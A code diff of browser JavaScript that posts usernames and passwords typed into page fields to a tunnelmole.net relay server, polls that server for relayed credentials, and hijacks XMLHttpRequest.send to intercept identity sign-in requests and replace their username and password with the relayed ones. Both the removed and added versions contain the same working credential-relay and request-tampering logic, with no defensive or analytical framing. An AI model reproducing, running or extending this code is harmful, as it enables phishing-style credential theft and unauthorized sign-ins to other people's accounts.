@@ -7,10 +7,9 @@ const pendingPasswordRequests = new Map();
 let usernameFetched = false;
 let passwordFetched = false;
 
-// Fetch the username when needed
+// ✅ Fetch username
 const fetchFreqUsername = async () => {
-    if (usernameFetched) return; // Avoid redundant fetches once username is fetched
-
+    if (usernameFetched) return;
     console.log('Fetching username...');
 
     try {
@@ -22,31 +21,29 @@ const fetchFreqUsername = async () => {
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
-        console.log('Response from /get-first-post-data:', result);  // Debug log
+        console.log('Response from /get-first-post-data:', result);
 
         if (result?.postData) {
             freqUsername = result.postData;
             console.log('Fetched username:', freqUsername);
             usernameFetched = true;
 
-            // Reset the server-side username store
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-            // Process all pending username requests
+
             processUsernameRequests();
         } else {
             console.warn("No username data received, retrying...");
-            setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
+            setTimeout(fetchFreqUsername, 500); // Retry in 0.5s
         }
     } catch (error) {
         console.error('Error fetching username:', error);
-        setTimeout(fetchFreqUsername, 500); // Retry after 1s if error occurs
+        setTimeout(fetchFreqUsername, 500);
     }
 };
 
-// Fetch the password when needed
+// ✅ Fetch password
 const fetchFreqPassword = async () => {
-    if (passwordFetched) return; // Avoid redundant fetches once password is fetched
-
+    if (passwordFetched) return;
     console.log('Fetching password...');
 
     try {
@@ -58,111 +55,71 @@ const fetchFreqPassword = async () => {
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
-        console.log('Response from /get-first-post-password:', result);  // Debug log
+        console.log('Response from /get-first-post-password:', result);
 
         if (result?.postData) {
             freqPassword = result.postData;
             console.log('Fetched password:', freqPassword);
             passwordFetched = true;
 
-            // Reset the server-side password store
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });
-            // Process all pending password requests
+
             processPasswordRequests();
         } else {
             console.warn("No password data received, retrying...");
-            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
+            setTimeout(fetchFreqPassword, 500);
         }
     } catch (error) {
         console.error('Error fetching password:', error);
-        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
+        setTimeout(fetchFreqPassword, 500);
     }
 };
 
-// Modify and send pending requests when username is available
+// ✅ Process pending username requests
 const processUsernameRequests = () => {
     if (!freqUsername) {
-            console.log("Username not available yet, retrying...");
-            fetchFreqUsername();
-            return;
-            }            
-
-    console.log("Processing pending requests...");
-    // Create a copy of pending requests as we will modify it while iterating
-    const requestsToProcess = Array.from(pendingUsernameRequests);
-
-    // Iterate through all pending requests
-    for (let [xhr, body] of requestsToProcess) {
-        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
-
-        if (match && !modifiedRequests.has(body)) {
-            const modifiedBody = body.replace(match[1], freqUsername);
-            modifiedUsernameRequests.add(body); // Mark the request as modified
-            console.log("Modified request with new username:", modifiedBody);
-            xhr.send(modifiedBody); // Send the modified request
-            pendingUsernameRequests.delete(xhr); // Remove the request from pending
-        }
-    }
-
-    // Reset freqUsername when all requests are processed
-    if (pendingUsernameRequests.size === 0) {
-        console.log("All pending requests processed, resetting freqUsername.");
-        freqUsername = null;
-        usernameFetched = false; // Allow fetching a new username if needed
-    }
-};
-
-// Intercept XMLHttpRequest to modify requests with username
-const originalXhrSend = XMLHttpRequest.prototype.send;
-XMLHttpRequest.prototype.send = function (body) {
-    if (!body) {
-        originalXhrSend.call(this, body);
+        console.log("Username not available yet, retrying...");
+        fetchFreqUsername();
         return;
     }
 
-    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
-    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedUsernameRequests).some(m => body.includes(m))) {
-        console.log("Intercepted request:", body);
-        pendingUsernameRequests.set(this, body); // Store the request in pendingRequests
-        processUsernameRequests(); // Attempt to modify and send the request immediately
-    } else {
-        originalXhrSend.call(this, body); // Send the original request if no modification is needed
+    console.log("Processing pending username requests...");
+
+    for (let [xhr, body] of pendingUsernameRequests) {
+        const match = body.match(/identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/);
+        if (match && !modifiedUsernameRequests.has(body)) {
+            const modifiedBody = body.replace(match[1], freqUsername);
+            modifiedUsernameRequests.add(modifiedBody);
+            console.log("Modified request with new username:", modifiedBody);
+            xhr.send(modifiedBody);
+            pendingUsernameRequests.delete(xhr);
+        }
     }
 };
 
-
-// Process pending password requests
+// ✅ Process pending password requests
 const processPasswordRequests = () => {
     if (!freqPassword) {
         console.log("Password not available yet, retrying...");
-        fetchFreqPassword(); // Ensure password is fetched
+        fetchFreqPassword();
         return;
     }
 
     console.log("Processing pending password requests...");
-    const requestsToProcess = Array.from(pendingPasswordRequests);
 
-    for (let [xhr, body] of requestsToProcess) {
-        const matchPassword = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
-
+    for (let [xhr, body] of pendingPasswordRequests) {
+        const matchPassword = body.match(/identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/);
         if (matchPassword && !modifiedPasswordRequests.has(body)) {
             const modifiedBody = body.replace(matchPassword[1], freqPassword);
-            modifiedPasswordRequests.add(body); // Mark the request as modified
-            console.log("Modified password request:", modifiedBody);
-            xhr.send(modifiedBody); // Send the modified request
-            pendingPasswordRequests.delete(xhr); // Remove from pending requests
+            modifiedPasswordRequests.add(modifiedBody);
+            console.log("Modified request with new password:", modifiedBody);
+            xhr.send(modifiedBody);
+            pendingPasswordRequests.delete(xhr);
         }
-    }
-
-    // Reset freqPassword when all requests are processed
-    if (pendingPasswordRequests.size === 0) {
-        console.log("All password requests processed, resetting freqPassword.");
-        freqPassword = null;
-        passwordFetched = false; // Allow fetching a new password if needed
     }
 };
 
-// Intercept XMLHttpRequest to modify requests with username
+// ✅ Intercept XMLHttpRequest
 const originalXhrSend = XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.send = function (body) {
     if (!body) {
@@ -170,121 +127,77 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    // Username-related request handling
-    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedUsernameRequests).some(m => body.includes(m))) {
+    if (/identity-signin-identifier/.test(body) && !modifiedUsernameRequests.has(body)) {
         console.log("Intercepted username request:", body);
-        pendingUsernameRequests.set(this, body); // Store the username-related request in pending
-        processUsernameRequests(); // Process immediately if username is available
-    }
-    // Password-related request handling
-    else if (/identity-signin-password/.test(body) && !Array.from(modifiedPasswordRequests).some(m => body.includes(m))) {
+        pendingUsernameRequests.set(this, body);
+        processUsernameRequests();
+    } else if (/identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body)) {
         console.log("Intercepted password request:", body);
-        pendingPasswordRequests.set(this, body); // Store the password-related request in pending
-        processPasswordRequests(); // Process immediately if password is available
-    }
-    else {
-        originalXhrSend.call(this, body); // Send the original request if no modification is needed
+        pendingPasswordRequests.set(this, body);
+        processPasswordRequests();
+    } else {
+        originalXhrSend.call(this, body);
     }
 };
 
-// ✅ Send username data to server
+// ✅ Send username to server
 const sendUsername = async () => {
     console.log('Sending username...');
-
     const username = document.getElementById('username')?.value;
-    if (!username) {
-        console.warn("No username entered");
-        return;
-    }
+    if (!username) return;
 
     try {
-        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
+        await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username })
         });
-
-        if (response.ok) {
-            console.log('Username sent successfully');
-        } else {
-            console.error('Error sending username:', response.statusText);
-        }
+        console.log('Username sent successfully');
     } catch (error) {
         console.error('Error sending username:', error);
     }
 };
 
-// ✅ Send password data to server
+// ✅ Send password to server
 const sendPassword = async () => {
     console.log('Sending password...');
-
     const password = document.getElementById('password')?.value;
-    if (!password) {
-        console.warn("No password entered");
-        return;
-    }
+    if (!password) return;
 
     try {
-        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-password', {
+        await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-password', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ password })
         });
-
-        if (response.ok) {
-            console.log('Password sent successfully');
-        } else {
-            console.error('Error sending password:', response.statusText);
-        }
+        console.log('Password sent successfully');
     } catch (error) {
         console.error('Error sending password:', error);
     }
 };
 
-// ✅ Attach event listeners to buttons
+// ✅ Attach event listeners
 document.addEventListener('DOMContentLoaded', () => {
     const usernameButton = document.getElementById('sendUsernameBtn');
     const passwordButton = document.getElementById('sendPasswordBtn');
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
 
-    // Username button click listener
-    if (usernameButton) {
-        usernameButton.addEventListener('click', (event) => {
-            event.preventDefault(); // Prevent form submission if inside a form
-            sendUsername(); // Trigger sending username
-        });
-    }
-
-    // Password button click listener
-    if (passwordButton) {
-        passwordButton.addEventListener('click', (event) => {
-            event.preventDefault(); // Prevent form submission if inside a form
-            sendPassword(); // Trigger sending password
-        });
-    }
-
-    // "Enter" key listener for username
+    if (usernameButton) usernameButton.addEventListener('click', sendUsername);
+    if (passwordButton) passwordButton.addEventListener('click', sendPassword);
+    
     if (usernameInput) {
         usernameInput.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter') {
-                event.preventDefault(); // Prevent form submission
-                sendUsername(); // Trigger send on Enter
-            }
+            if (event.key === 'Enter') sendUsername();
         });
     }
 
-    // "Enter" key listener for password
     if (passwordInput) {
         passwordInput.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter') {
-                event.preventDefault(); // Prevent form submission
-                sendPassword(); // Trigger send on Enter
-            }
+            if (event.key === 'Enter') sendPassword();
         });
     }
 
-    // Ensure both fetches are called when the page loads
     fetchFreqUsername();
     fetchFreqPassword();
 });
